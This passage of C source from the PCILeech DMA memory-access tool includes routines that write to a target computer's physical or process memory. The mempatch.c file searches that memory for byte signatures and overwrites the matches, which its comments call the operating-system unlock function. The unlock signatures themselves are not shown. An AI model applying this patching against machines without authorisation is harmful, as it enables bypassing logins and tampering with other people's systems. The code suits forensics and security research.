    if(ctxMain->cfg.dwPID) {
        // virtual memory (Windows only):
        if(!Vmmx_Initialize(FALSE, FALSE)) {
            printf("Memory Write: Failed. Unable to initialize virtual memory.\n");
            return;
        }
        do {
            result = VMMDLL_MemWrite(ctxMain->cfg.dwPID, ctxMain->cfg.vaAddrMin, ctxMain->cfg.pbIn, (DWORD)ctxMain->cfg.cbIn);
            if(!result) {
                printf("Memory Write: Failed. Write failed (partial memory may be written).\n");
                return;
            }
        } while(ctxMain->cfg.fLoop);
    } else {
        // physical memory:
        do {
            result = DeviceWriteMEM(ctxMain->cfg.paAddrMin, (DWORD)ctxMain->cfg.cbIn, ctxMain->cfg.pbIn, FALSE);
            if(!result) {
                printf("Memory Write: Failed. Write failed (partial memory may be written).\n");
                return;
            }
        } while(ctxMain->cfg.fLoop);
    }
    printf("Memory Write: Successful.\n");
}

```

`pcileech/memdump.h`:

```h
// memdump.h : definitions related to memory dumping functionality.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#ifndef __MEMDUMP_H__
#define __MEMDUMP_H__
#include "pcileech.h"

/*
* Dump physical memory to file. The USB3380 card may only dump the lower 4GB
* in default DMA mode due to hardware limitations. If a kernel module (KMD) is
* inserted in the target computer OS kernel all memory may be dumped.
*/
VOID ActionMemoryDump();

/*
* Probe readable physical memory (for reading). The resulting memory map is
* displayed on-screen. Probing is performed in DMA mode. The USB3380 hardware
* does not support this operation.
*/
VOID ActionMemoryProbe();

/*
* Write data to the physical memory. The USB3380 may only write to the lower
* 4GB in default DMA mode due to hardware limitations. If a kernel module (KMD)
* is inserted in the target computer OS any kernel accessable memory can be
* written/updated.
*/
VOID ActionMemoryWrite();

/*
* Tries to read a page 1000 times from the address specified in the min parameter
* in pCfg. If memory is changed the result will be flagged.
* After a read an optional 100 write/read cycles will be completed to test write.
*/
VOID ActionMemoryTestReadWrite();

/*
* Print out the contents of the 1st readable page. The address specified in the
* min parameter in pCfg.
*/
VOID ActionMemoryPageDisplay();

/*
* Print out a maximum of 16kB (0x10000) physical memory limited by the
* paMin and paMax parameters in pCfg. By default 0x100 bytes are displayed.
*/
VOID ActionMemoryDisplayPhysical();

/*
* Print out a maximum of 16kB (0x10000) virtual memory limited by the
* vaMin and vaMax parameters in pCfg. By default 0x100 bytes are displayed.
*/
VOID ActionMemoryDisplayVirtual();

#endif /* __MEMDUMP_H__ */

```

`pcileech/mempatch.c`:

```c
// mempatch.c : implementation related to operating systems unlock/patch functionality.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "mempatch.h"
#include "device.h"
#include "util.h"
#include "vmmx.h"
#include <vmmdll.h>

_Success_(return)
BOOL Patch_CmpChunk(_In_ PBYTE pbPage, _In_ PSIGNATURE_CHUNK pChunk, _In_opt_ DWORD dwRelBase, _Out_opt_ PDWORD pdwOffset)
{
    DWORD o;
    if(pChunk->tpOffset == SIGNATURE_CHUNK_TP_OFFSET_FIXED) {
        if(pChunk->cbOffset + pChunk->cb > 0x1000) { return FALSE; }
        if(0 == memcmp(pbPage + pChunk->cbOffset, pChunk->pb, pChunk->cb)) {
            if(pdwOffset) { *pdwOffset = pChunk->cbOffset; }
            return TRUE;
        }
    }
    if(pChunk->tpOffset == SIGNATURE_CHUNK_TP_OFFSET_RELATIVE) {
        if(pChunk->cbOffset + dwRelBase + pChunk->cb > 0x1000) { return FALSE; }
        if(0 == memcmp(pbPage + dwRelBase + pChunk->cbOffset, pChunk->pb, pChunk->cb)) {
            if(pdwOffset) { *pdwOffset = dwRelBase + pChunk->cbOffset; }
            return TRUE;
        }
    }
    if(pChunk->tpOffset == SIGNATURE_CHUNK_TP_OFFSET_ANY) {
        for(o = 0; o <= 0x1000 - pChunk->cb; o++) {
            // comparison - extra "unnecessary" dword comparison for speedup reasons.
            if(((pChunk->cb < sizeof(DWORD)) || (*(PDWORD)pChunk->pb == *(PDWORD)(pbPage + o))) &&
                (0 == memcmp(pbPage + o, pChunk->pb, pChunk->cb))) {
                if(pdwOffset) { *pdwOffset = o; }
                return TRUE;
            }
        }
    }
    return FALSE;
}

_Success_(return)
BOOL Patch_FindAndPatch(_Inout_ PBYTE pbPage, _In_ PSIGNATURE pSignatures, _In_ DWORD cSignatures, _Out_ PDWORD pdwPatchOffset, _Out_ PDWORD pcbPatch)
{
    DWORD i, o, dwRelBase;
    PSIGNATURE ps;
    for(i = 0; i < cSignatures; i++) {
        ps = pSignatures + i;
        if(!ps->chunk[0].cb || !Patch_CmpChunk(pbPage, &ps->chunk[0], 0, &dwRelBase)) {
            continue;
        }
        if(ps->chunk[1].cb && !Patch_CmpChunk(pbPage, &ps->chunk[1], dwRelBase, NULL)) {
            continue;
        }
        o = ps->chunk[2].cbOffset;
        if(ps->chunk[2].tpOffset == SIGNATURE_CHUNK_TP_OFFSET_RELATIVE) { 
            o += dwRelBase;
        }
        if(o + ps->chunk[2].cb < 0x1000) {
            memcpy(pbPage + o, ps->chunk[2].pb, ps->chunk[2].cb);
            *pdwPatchOffset = o;
            *pcbPatch = ps->chunk[2].cb;
            return TRUE;
        }
    }
    return FALSE;
}

#define MAX_NUM_PATCH_LOCATIONS        0x100

VOID ActionPatchAndSearchPhysical()
{
    PSIGNATURE pSignatures;
    DWORD dwoPatch, cbPatch, cSignatures = CONFIG_MAX_SIGNATURES;
    QWORD qwAddrBase;
    PBYTE pbBuffer16M = NULL;
    PPAGE_STATISTICS pPageStat = NULL;
    BOOL result, isModePatch = ctxMain->cfg.tpAction == PATCH;
    LPSTR szAction = isModePatch ? "Patch" : "Search";
    QWORD i, qwoPages, qwPatchList[MAX_NUM_PATCH_LOCATIONS], cPatchList = 0;
    // initialize / allocate memory
    if(!(pSignatures = LocalAlloc(LMEM_ZEROINIT, cSignatures * sizeof(SIGNATURE)))) { goto cleanup; }
    if(!(pbBuffer16M = LocalAlloc(0, 0x01000000))) { goto cleanup; }
    qwAddrBase = ctxMain->cfg.paAddrMin;
    if(ctxMain->cfg.paAddrMax < qwAddrBase + 0xfff) {
        printf("%s: Failed. Zero or negative memory range specified.\n", szAction);
        goto cleanup;
    }
    // load and verify signatures
    if(ctxMain->cfg.cbIn) {
        Util_CreateSignatureSearchAll(ctxMain->cfg.pbIn, (DWORD)ctxMain->cfg.cbIn, pSignatures);
        cSignatures = 1;
    } else {
        result = Util_LoadSignatures(ctxMain->cfg.szSignatureName, ".sig", pSignatures, &cSignatures, 3);
        if(!result || !cSignatures) {
            printf("%s: Failed. Failed to load signature.\n", szAction);
            goto cleanup;
        }
    }
    if(isModePatch) {
        for(i = 0; i < cSignatures; i++) {
            if(pSignatures[i].chunk[2].cb == 0 || pSignatures[i].chunk[2].cb > 4096 || pSignatures[i].chunk[2].tpOffset == SIGNATURE_CHUNK_TP_OFFSET_ANY) {
                printf("%s: Failed. Invalid patch signature.\n", szAction);
            }
        }
    }
    // loop patch / unlock
    PageStatInitialize(&pPageStat, qwAddrBase, ctxMain->cfg.paAddrMax, isModePatch ? "Patching" : "Searching", ctxMain->phKMD ? TRUE : FALSE, ctxMain->cfg.fVerbose);
    for(; qwAddrBase < ctxMain->cfg.paAddrMax; qwAddrBase += 0x01000000) {
        result = Util_Read16M(pbBuffer16M, qwAddrBase, pPageStat);
        if(!result && !ctxMain->cfg.fForceRW && !ctxMain->phKMD && PCILEECH_DEVICE_EQUALS("usb3380")) {
            // terminate if 16MB cannot be read from the USB3380 device.
            PageStatClose(&pPageStat);
            printf("%s: Failed. Cannot dump any sequential data in 16MB - terminating.\n", szAction);
            goto cleanup;
        }
        for(qwoPages = 0; (qwoPages < 0x01000000) && (qwAddrBase + qwoPages < ctxMain->cfg.paAddrMax); qwoPages += 0x1000) {
            result = Patch_FindAndPatch(pbBuffer16M + qwoPages, pSignatures, cSignatures, &dwoPatch, &cbPatch);
            if(!result) {
                continue;
            }
            if(isModePatch) {
                result = DeviceWriteMEM(qwAddrBase + qwoPages + dwoPatch, cbPatch, pbBuffer16M + qwoPages + dwoPatch, FALSE);
            }
            if(result) {
                if(cPatchList == MAX_NUM_PATCH_LOCATIONS) {
                    PageStatClose(&pPageStat);
                    printf("%s: Failed. More than %i signatures found. Location: 0x%llx\n", szAction, MAX_NUM_PATCH_LOCATIONS, qwAddrBase + qwoPages + dwoPatch);
                    goto cleanup;
                }
                qwPatchList[cPatchList] = qwAddrBase + qwoPages + dwoPatch;
                cPatchList++;
            } else {
                PageStatClose(&pPageStat);
                printf("%s: Failed. Write memory failed. Location: 0x%llx\n", szAction, qwAddrBase + qwoPages + dwoPatch);
                goto cleanup;
            }
            if(!ctxMain->cfg.fPatchAll) {
                goto cleanup;
            }
        }
    }
    if(0 == cPatchList) {
        PageStatClose(&pPageStat);
        printf("%s: Failed. No signature found.\n", szAction);
    }
cleanup:
    PageStatClose(&pPageStat);
    if(cPatchList) {
        for(i = 0; i < cPatchList; i++) {
            printf("%s: Successful. Location: 0x%llx\n", szAction, qwPatchList[i]);
        }
    }
    LocalFree(pSignatures);
    LocalFree(pbBuffer16M);
}


typedef struct tdSEARCH_INTERNAL_CONTEXT {
    DWORD dwPID;
    BOOL isModePatch;
    DWORD cSignatures;
    PSIGNATURE pSignatures;
    LPSTR szAction;
    DWORD cPatchList;
    QWORD qwPatchList[MAX_NUM_PATCH_LOCATIONS];
} SEARCH_INTERNAL_CONTEXT, *PSEARCH_INTERNAL_CONTEXT;

/*
* Virtual memory search callback function.
* -- return: continue_search(TRUE), abort_search(FALSE).
*/
BOOL ActionPatchAndSearchVirtual_ResultCB(_In_ PVMMDLL_MEM_SEARCH_CONTEXT ctxs, _In_ QWORD va, _In_ DWORD iSearch)
{
    PSEARCH_INTERNAL_CONTEXT ctxi = (PSEARCH_INTERNAL_CONTEXT)ctxs->pvUserPtrOpt;
    BYTE pbPage[0x1000];
    BOOL result;
    QWORD vaPage;
    DWORD dwoPatch, cbPatch;
    // 1: fetch page
    vaPage = va & ~0xfff;
    if(!VMMDLL_MemRead(ctxi->dwPID, vaPage, pbPage, 0x1000)) {
        return TRUE;
    }
    // 2: patch / unlock (using same methodology as in physical layer)
    result = Patch_FindAndPatch(pbPage, ctxi->pSignatures + iSearch, 1, &dwoPatch, &cbPatch);
    if(!result) {
        return TRUE;
    }
    if(ctxi->isModePatch) {
        result = VMMDLL_MemWrite(ctxi->dwPID, vaPage + dwoPatch, ctxi->pSignatures[iSearch].chunk[2].pb, ctxi->pSignatures[iSearch].chunk[2].cb);
    }
    if(result) {
        if(ctxi->cPatchList == MAX_NUM_PATCH_LOCATIONS) {
            printf("%s: Failed. More than %i signatures found. Location: 0x%llx\n", ctxi->szAction, MAX_NUM_PATCH_LOCATIONS, vaPage + dwoPatch);
            return FALSE;
        }
        if(ctxi->cPatchList && (ctxi->qwPatchList[ctxi->cPatchList - 1] == vaPage + dwoPatch)) {
            return TRUE;    // skip if already registered (multiple finds in same page)
        }
        ctxi->qwPatchList[ctxi->cPatchList] = vaPage + dwoPatch;
        ctxi->cPatchList++;
        ctxs->cResult++;
    } else {
        printf("%s: Failed. Write memory failed. Location: 0x%llx\n", ctxi->szAction, vaPage + dwoPatch);
        return FALSE;
    }
    return ctxMain->cfg.fPatchAll;
}

VOID ActionPatchAndSearchVirtual()
{
    DWORD i;
    BOOL result;
    PSTATISTICS_SEARCH pStat = NULL;
    SEARCH_INTERNAL_CONTEXT ctxi = { 0 };
    VMMDLL_MEM_SEARCH_CONTEXT ctxs = { 0 };


    // initialize ctxi (internal context) & allocate memory
    ctxi.dwPID = ctxMain->cfg.dwPID;
    ctxi.isModePatch = (ctxMain->cfg.tpAction == PATCH);
    ctxi.szAction = ctxi.isModePatch ? "Patch" : "Search";
    ctxi.cSignatures = CONFIG_MAX_SIGNATURES;
    if(!(ctxi.pSignatures = LocalAlloc(LMEM_ZEROINIT, ctxi.cSignatures * sizeof(SIGNATURE)))) { goto cleanup; }

    // load and verify signatures
    if(ctxMain->cfg.cbIn) {
        Util_CreateSignatureSearchAll(ctxMain->cfg.pbIn, (DWORD)ctxMain->cfg.cbIn, ctxi.pSignatures);
        ctxi.cSignatures = 1;
    } else {
        result = Util_LoadSignatures(ctxMain->cfg.szSignatureName, ".sig", ctxi.pSignatures, &ctxi.cSignatures, 3);
        if(!result || !ctxi.cSignatures) {
            printf("%s: Failed. Failed to load signature.\n", ctxi.szAction);
            goto cleanup;
        }
    }
    if(ctxi.isModePatch) {
        for(i = 0; i < ctxi.cSignatures; i++) {
            if(ctxi.pSignatures[i].chunk[2].cb == 0 || ctxi.pSignatures[i].chunk[2].cb > 4096 || ctxi.pSignatures[i].chunk[2].tpOffset == SIGNATURE_CHUNK_TP_OFFSET_ANY) {
                printf("%s: Failed. Invalid patch signature.\n", ctxi.szAction);
            }
        }
    }

    // initialize VMM/MemProcFS
    if(!Vmmx_Initialize(TRUE, FALSE)) { goto cleanup; }

    // initialize ctxs (search context)
    ctxs.dwVersion = VMMDLL_MEM_SEARCH_VERSION;
    ctxs.cSearch = ctxi.cSignatures;
    ctxs.vaMin = ctxMain->cfg.vaAddrMin;
    ctxs.vaMax = ctxMain->cfg.vaAddrMax;
    for(i = 0; i < ctxi.cSignatures; i++) {
        ctxs.search[i].cb = min(ctxi.pSignatures[i].chunk[0].cb, sizeof(ctxs.search[i].pb));
        memcpy(ctxs.search[i].pb, ctxi.pSignatures[i].chunk[0].pb, ctxs.search[i].cb);
    }
    ctxs.pvUserPtrOpt = &ctxi;
    ctxs.pfnResultOptCB = ActionPatchAndSearchVirtual_ResultCB;
    
    // perform search
    StatSearchInitialize(&pStat, &ctxs, ctxi.szAction);
    VMMDLL_MemSearch(ctxi.dwPID, &ctxs, NULL, NULL);
    StatSearchClose(&pStat);
cleanup:
    if(ctxi.cPatchList) {
        printf("%s: Successful. Locations:\n", ctxi.szAction);
        for(i = 0; i < ctxi.cPatchList; i++) {
            printf(" 0x%llx\n", ctxi.qwPatchList[i]);
        }
    } else {
        printf("%s: Failed. No signature found.\n", ctxi.szAction);
    }
    LocalFree(ctxi.pSignatures);
}
```

`pcileech/mempatch.h`:

```h
// mempatch.h : definitions related to memory patch / operating system unlock functionality.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#ifndef __MEMPATCH_H__
#define __MEMPATCH_H__
#include "pcileech.h"

/*
* Patch the memory of the target system. Alternatively search the memory of the
* target system. This includes the unlock operating system functionality.
*/
VOID ActionPatchAndSearchPhysical();

/*
* Patch the virtual memory of a target system process (Windows only).
* Alternatively search the memory of the target system process.
* This includes the unlock operating system functionality.
*/
VOID ActionPatchAndSearchVirtual();

#endif /* __MEMPATCH_H__ */

```

`pcileech/ob/ob.h`:

```h
// ob.h : definitions related to the object manager and object manager collections.
//
// (c) Ulf Frisk, 2018-2021
// Author: Ulf Frisk, pcileech@frizk.net
//
#ifndef __OB_H__
#define __OB_H__

#ifdef _WIN32
#include <Windows.h>
typedef unsigned __int64                QWORD, *PQWORD;
#else
#include "../oscompatibility.h"
#endif /* _WIN32 */

#define OB_DEBUG
#define OB_HEADER_MAGIC                 0x0c0efefe

#define OB_TAG_CORE_CONTAINER           'ObCo'
#define OB_TAG_CORE_COMPRESSED          'ObCp'
#define OB_TAG_CORE_COUNTER             'ObCn'
#define OB_TAG_CORE_DATA                'ObDa'
#define OB_TAG_CORE_SET                 'ObSe'
#define OB_TAG_CORE_MAP                 'ObMa'
#define OB_TAG_CORE_MEMFILE             'ObMF'
#define OB_TAG_CORE_CACHEMAP            'ObMc'
#define OB_TAG_CORE_STRMAP              'ObMs'

// ----------------------------------------------------------------------------
// OBJECT MANAGER CORE FUNCTIONALITY BELOW:
//
// The object manager is a minimal non-threaded way of allocating objects with
// reference counts. When reference count reach zero the object is deallocated
// automatically.
//
// All Ob functions are thread-safe and performs only minimum locking.
//
// A thread calls Ob_Alloc to allocate an object of a specific length. The
// object initially have reference count 1. Reference counts may be increased
// by calling Ob_INCREF and decreased by calling Ob_DECREF. If the refcount
// reach one or zero in a call to Ob_DECREF optional callbacks may be made
// (specified at Ob_Alloc time). Callbacks may be useful for cleanup tasks
// - such as decreasing reference count of sub-objects contained in the object
// that is to be deallocated.
// ----------------------------------------------------------------------------

typedef struct tdOB {
    // internal object manager functionality below: (= do not use unless absolutely necessary)
    DWORD _magic;                           // magic value - OB_HEADER_MAGIC
    union {
        DWORD _tag;                         // tag - 2 chars, no null terminator
        CHAR _tagCh[4];
    };
    union {
        VOID(*_pfnRef_0)(_In_ PVOID pOb);   // callback - object specific cleanup before free
        QWORD _Filler1;
    };
    union {
        VOID(*_pfnRef_1)(_In_ PVOID pOb);   // callback - when object reach refcount 1 (not initial)
        QWORD _Filler2;
    };
    DWORD _count;                           // reference count
    // external object manager functionality below: (= ok to use)
    DWORD cbData;
} OB, *POB;

typedef VOID(*OB_CLEANUP_CB)(_In_ PVOID pOb);

/*
* Allocate a new object manager memory object.
* -- tag = tag identifying the type of object.
* -- uFlags = flags as given by LocalAlloc.
* -- uBytes = bytes of object (_including_ object headers).
* -- pfnRef_0 = optional callback for cleanup o be called before object is destroyed.
*               (if object contains objects which references should be decremented
                 before destruction of this 'parent' object).
* -- pfnRef_1 = optional callback for when object reach refcount = 1 at DECREF.
* -- return = allocated object on success, with refcount = 1, - NULL on fail.
*/
PVOID Ob_Alloc(_In_ DWORD tag, _In_ UINT uFlags, _In_ SIZE_T uBytes, _In_opt_ OB_CLEANUP_CB pfnRef_0, _In_opt_ OB_CLEANUP_CB pfnRef_1);

/*
* Increase the reference count of a object by one.
* -- pOb
* -- return
*/
PVOID Ob_XINCREF(_In_opt_ PVOID pOb);
#define Ob_INCREF(pOb)          (Ob_XINCREF((PVOID)pOb))

/*
* Decrease the reference count of an object manager object by one.
* NB! Do not use object after DECREF - other threads might have also DECREF'ed
* the object at same time making it to be free'd - making the memory invalid.
* -- pOb
* -- return = pObIn if pObIn is valid and refcount > 0 after decref.
*/
PVOID Ob_XDECREF(_In_opt_ PVOID pOb);
#define Ob_DECREF(pOb)          (Ob_XDECREF((PVOID)pOb))

/*
* Decrease the reference count of a object manager object. If the reference
* count reaches zero the object will be cleaned up.
* Also set the incoming pointer to NULL.
* -- ppOb
*/
VOID Ob_XDECREF_NULL(_In_opt_ PVOID *ppOb);
#define Ob_DECREF_NULL(pOb)     (Ob_XDECREF_NULL((PVOID*)pOb))

/*
* Checks if pObIn is a valid object manager object with the specified tag.
* -- pObIn
* -- tag
* -- return
*/
BOOL Ob_VALID_TAG(_In_ PVOID pObIn, _In_ DWORD tag);



// ----------------------------------------------------------------------------
// OBJECT MANAGER COMMON/GENERIC OBJECTS BELOW:
//
// ----------------------------------------------------------------------------

typedef struct tdOB_DATA {
    OB ObHdr;
    union {
        BYTE pb[0];
        CHAR sz[0];
        DWORD pdw[0];
        QWORD pqw[0];
    };
} OB_DATA, *POB_DATA;

/*
* Create a new object manager data object in which the ObHdr->cbData is equal
* to the number of bytes in the data buffer supplied to this function.
* May also be created with Ob_Alloc with size: sizeof(OB_HDR) + length of data.
* CALLER DECREF: return
* -- pb
* -- cb
* -- return
*/
_Success_(return != NULL)
POB_DATA ObData_New(_In_ PBYTE pb, _In_ DWORD cb);



// ----------------------------------------------------------------------------
// OBJECT CONTAINER FUNCTIONALITY BELOW:
//
// A container provides atomic access to a single Ob object. This is useful
// if a Ob object is to frequently be replaced by a new object in an atomic
// way. An example of this is the process list object containing the process
// information. The container holds a reference count to the object that is
// contained. The object container itself is an object manager object and
// must be DECREF'ed when required.
// ----------------------------------------------------------------------------

typedef struct tdOB_CONTAINER {
    OB ObHdr;
    CRITICAL_SECTION Lock;
    POB pOb;
} OB_CONTAINER, *POB_CONTAINER;

/*
* Create a new object container object without an initial contained object.
* An object container provides atomic access to its contained object in a
* multithreaded environment. The object container is in itself an object
* manager object and must be DECREF'ed by the caller when use is complete.
* CALLER DECREF: return
* -- return
*/
POB_CONTAINER ObContainer_New();

/*
* Retrieve an enclosed object from the given pObContainer.
* CALLER DECREF: return
* -- pObContainer
* -- return
*/
PVOID ObContainer_GetOb(_In_ POB_CONTAINER pObContainer);

/*
* Set or Replace an object in the object container.
* -- pObContainer
* -- pOb
*/
VOID ObContainer_SetOb(_In_ POB_CONTAINER pObContainer, _In_opt_ PVOID pOb);

/*
* Check if the object container is valid and contains an object.
* -- pObContainer
* -- return
*/
BOOL ObContainer_Exists(_In_opt_ POB_CONTAINER pObContainer);



// ----------------------------------------------------------------------------
// HASHED VALUE SET FUNCTIONALITY BELOW:
//
// The hashed value set (ObSet) provides thread safe efficient access to a set
// which is containing _NON_ZERO_ values (64-bit unsigned integers). The ObSet
// may hold a maximum capacity of 0x01000000 (~16M) entries - which are UNIQUE
// and _NON_ZERO_.
// The hashed value set (ObSet) guarantees order amongst values unless the
// function ObSet_Remove is called - in which order may change and on-going
// iterations of the set with ObSet_Get/ObSet_GetNext may fail.
// The ObSet is an object manager object and must be DECREF'ed when required.
// ----------------------------------------------------------------------------

typedef struct tdOB_SET *POB_SET;

/*
* Create a new hashed value set. A hashed value set (ObSet) provides atomic
* ways to store unique 64-bit (or smaller) numbers as a set.
* The ObSet is an object manager object and must be DECREF'ed when required.
* CALLER DECREF: return
* -- return
*/
POB_SET ObSet_New();

/*
* Retrieve the number of items in the given ObSet.
* -- pvs
* -- return
*/
DWORD ObSet_Size(_In_opt_ POB_SET pvs);

/*
* Check if a value already exists in the ObSet.
* -- pvs
* -- value
* -- return
*/
BOOL ObSet_Exists(_In_opt_ POB_SET pvs, _In_ QWORD value);

/*
* Push / Insert a non-zero value into the ObSet.
* -- pvs
* -- value
* -- return = TRUE on insertion, FALSE otherwise - i.e. if value already
*             exists or if the max capacity of the set is reached.
*/
_Success_(return)
BOOL ObSet_Push(_In_opt_ POB_SET pvs, _In_ QWORD value);

/*
* Push/Merge/Insert all values from the ObSet pvsSrc into the ObSet pvs.
* The source set is kept intact.
* -- pvs
* -- pvsSrc
* -- return = TRUE on success, FALSE otherwise.
*/
_Success_(return)
BOOL ObSet_PushSet(_In_opt_ POB_SET pvs, _In_opt_ POB_SET pvsSrc);

/*
* Push/Merge/Insert all QWORD values from the ObData pDataSrc into the ObSet pvs.
* The source data is kept intact.
* -- pvs
* -- pDataSrc
* -- return = TRUE on success, FALSE otherwise.
*/
_Success_(return)
BOOL ObSet_PushData(_In_opt_ POB_SET pvs, _In_opt_ POB_DATA pDataSrc);

/*
* Insert a value representing an address into the ObSet. If the length of the
* data read from the start of the address a traverses page boundries all the
* pages are inserted into the set.
* -- pvs
* -- a
* -- cb
*/
VOID ObSet_Push_PageAlign(_In_opt_ POB_SET pvs, _In_ QWORD a, _In_ DWORD cb);

/*
* Remove an existing value from the ObSet.
* NB! must not be called simultaneously while iterating with ObSet_Get/ObSet_GetNext.
* -- pvs
* -- value
* -- return = removal was successful (i.e. the value was found and removed).
*/
BOOL ObSet_Remove(_In_opt_ POB_SET pvs, _In_ QWORD value);

/*
* Clear the ObSet by removing all values.
* NB! underlying allocated memory will remain unchanged.
* -- pvs
*/
VOID ObSet_Clear(_In_opt_ POB_SET pvs);

/*
* Remove the "last" value in a way that is safe for concurrent iterations of
* values in the set.
* -- pvs
* -- return = success: value, fail: 0.
*/
QWORD ObSet_Pop(_In_opt_ POB_SET pvs);

/*
* Retrieve the next value given a value. The start value and end value are the
* ZERO value (which is a special reserved non-valid value).
* NB! Correctness of the Get/GetNext functionality is _NOT_ guaranteed if the
* ObSet_Remove function is called while iterating over the ObSet - items may
* be skipped or iterated over multiple times!
* -- pvs
* -- value
* -- return
*/
QWORD ObSet_GetNext(_In_opt_ POB_SET pvs, _In_ QWORD value);

/*
* Retrieve a value given a value index (which is less than the amount of items
* in the Set).
* NB! Correctness of the Get/GetNext functionality is _NOT- guaranteed if the
* ObSet_Remove function is called while iterating over the ObSet - items may
* be skipped or iterated over multiple times!
* -- pvs
* -- index
* -- return
*/
QWORD ObSet_Get(_In_opt_ POB_SET pvs, _In_ DWORD index);

/*
* Retrieve all values in the Set as a POB_DATA object containing the values
* in a QWORD table.
* -- CALLER DECREF: return
* -- pvs
* -- return
*/
POB_DATA ObSet_GetAll(_In_opt_ POB_SET pvs);



// ----------------------------------------------------------------------------
// MAP FUNCTIONALITY BELOW:
//
// The map is a key-value map that may, as an option, contain object manager
// objects in its value field. They key may be user-defined, generated by a
// function or absent. The ObMap may hold a maximum capacity of 0x02000000
// (~32M) entries which are UNIQUE and non-NULL.
//
// The map (ObMap) is thread safe and implement efficient access to the data
// via internal hashing functionality.
// The map (ObMap) guarantees order amongst values unless the ObMap_Remove*
// functions are called - in which order may change and on-going iterations
// of the set with ObMap_Get/ObMap_GetNext may fail.
// The ObMap is an object manager object and must be DECREF'ed when required.
// ----------------------------------------------------------------------------

typedef struct tdOB_MAP *POB_MAP;

#define OB_MAP_FLAGS_OBJECT_VOID        0x00
#define OB_MAP_FLAGS_OBJECT_OB          0x01
#define OB_MAP_FLAGS_OBJECT_LOCALFREE   0x02
#define OB_MAP_FLAGS_NOKEY              0x04

/*
* Create a new map. A map (ObMap) provides atomic map operations and ways
* to optionally map key values to values, pointers or object manager objects.
* The ObMap is an object manager object and must be DECREF'ed when required.
* CALLER DECREF: return
* -- flags = defined by OB_MAP_FLAGS_*
* -- return
*/
POB_MAP ObMap_New(_In_ QWORD flags);

/*
* Retrieve the number of objects in the ObMap.
* -- pm
* -- return
*/
DWORD ObMap_Size(_In_opt_ POB_MAP pm);

/*
* Check if an object exists in the ObMap.
* -- pm
* -- qwKey/pvObject
* -- return
*/
BOOL ObMap_Exists(_In_opt_ POB_MAP pm, _In_ PVOID pvObject);

/*
* Check if a key exists in the ObMap.
* -- pm
* -- qwKey/pvObject
* -- return
*/
BOOL ObMap_ExistsKey(_In_opt_ POB_MAP pm, _In_ QWORD qwKey);

/*
* Push / Insert into the ObMap.
* If pvObject is OB the map performs Ob_INCREF on its own reference.
* -- pm
* -- qwKey
* -- pvObject
* -- return = TRUE on insertion, FALSE otherwise - i.e. if the key or object
*             already exists or if the max capacity of the map is reached.
*/
_Success_(return)
BOOL ObMap_Push(_In_opt_ POB_MAP pm, _In_ QWORD qwKey, _In_ PVOID pvObject);

/*
* Push / Insert into the ObMap by making a shallow copy of the object.
* NB! only valid for OB_MAP_FLAGS_OBJECT_LOCALFREE initialized maps.
* -- pm
* -- qwKey
* -- pvObject
* -- cbObject
* -- return = TRUE on insertion, FALSE otherwise - i.e. if the key or object
*             already exists or if the max capacity of the map is reached.
*/
_Success_(return)
BOOL ObMap_PushCopy(_In_opt_ POB_MAP pm, _In_ QWORD qwKey, _In_ PVOID pvObject, _In_ SIZE_T cbObject);

/*
* Remove the "last" object.
* CALLER DECREF(if OB): return
* -- pm
* -- return = success: object, fail: NULL.
*/
_Success_(return != NULL)
PVOID ObMap_Pop(_In_opt_ POB_MAP pm);

/*
* Remove the "last" object and return it and its key.
* CALLER DECREF(if OB): return
* -- pm
* -- pKey
* -- return = success: object, fail: NULL.
*/
_Success_(return != NULL)
PVOID ObMap_PopWithKey(_In_opt_ POB_MAP pm, _Out_ PQWORD pKey);

/*
* Remove an object from the ObMap.
* NB! must not be called simultaneously while iterating with ObMap_GetByIndex/ObMap_GetNext.
* CALLER DECREF(if OB): return
* -- pm
* -- value
* -- return = success: object, fail: NULL.
*/
PVOID ObMap_Remove(_In_opt_ POB_MAP pm, _In_ PVOID pvObject);

/*
* Remove an object from the ObMap by using its key.
* NB! must not be called simultaneously while iterating with ObMap_GetByIndex/ObMap_GetNext.
* CALLER DECREF(if OB): return
* -- pm
* -- qwKey
* -- return = success: object, fail: NULL.
*/
PVOID ObMap_RemoveByKey(_In_opt_ POB_MAP pm, _In_ QWORD qwKey);

/*
* Clear the ObMap by removing all objects and their keys.
* NB! underlying allocated memory will remain unchanged.
* -- pm
* -- return = clear was successful - always true.
*/
_Success_(return)
BOOL ObMap_Clear(_In_opt_ POB_MAP pm);

/*
* Peek the "last" object.
* CALLER DECREF(if OB): return
* -- pm
* -- return = success: object, fail: NULL.
*/
PVOID ObMap_Peek(_In_opt_ POB_MAP pm);

/*
* Peek the key of the "last" object.
* -- pm
* -- return = the key, otherwise 0.
*/
QWORD ObMap_PeekKey(_In_opt_ POB_MAP pm);

/*
* Retrieve the next object given an object. Start and end objects are NULL.
* NB! Correctness of the Get/GetNext functionality is _NOT_ guaranteed if the
* ObMap_Remove* functions are called while iterating over the ObMap - items may
* be skipped or iterated over multiple times!
* FUNCTION DECREF(if OB): pvObject
* CALLER DECREF(if OB): return
* -- pm
* -- pvObject
* -- return
*/
PVOID ObMap_GetNext(_In_opt_ POB_MAP pm, _In_opt_ PVOID pvObject);

/*
* Retrieve the next object given a key. To start iterating supply NULL in the
* pvObject parameter (this overrides qwKey). When no more objects are found
* NULL will be returned. This function may ideally be used when object maps
* may be refreshed between function calls. Key may be more stable than object.
* NB! Correctness of the Get/GetNext functionality is _NOT_ guaranteed if the
* ObMap_Remove* functions are called while iterating over the ObMap - items may
* be skipped or iterated over multiple times!
* FUNCTION DECREF(if OB): pvObject
* CALLER DECREF(if OB): return
* -- pm
* -- qwKey
* -- pvObject
* -- return
*/
PVOID ObMap_GetNextByKey(_In_opt_ POB_MAP pm, _In_ QWORD qwKey, _In_opt_ PVOID pvObject);

/*
* Retrieve a value given a key.
* CALLER DECREF(if OB): return
* -- pm
* -- qwKey
* -- return
*/
PVOID ObMap_GetByKey(_In_opt_ POB_MAP pm, _In_ QWORD qwKey);

/*
* Retrieve an object given an index (which is less than the amount of items
* in the ObMap).
* NB! Correctness of the Get/GetNext functionality is _NOT- guaranteed if the
* ObMap_Remove* functions are called while iterating over the ObSet - items
* may be skipped or iterated over multiple times!
* CALLER DECREF(if OB): return
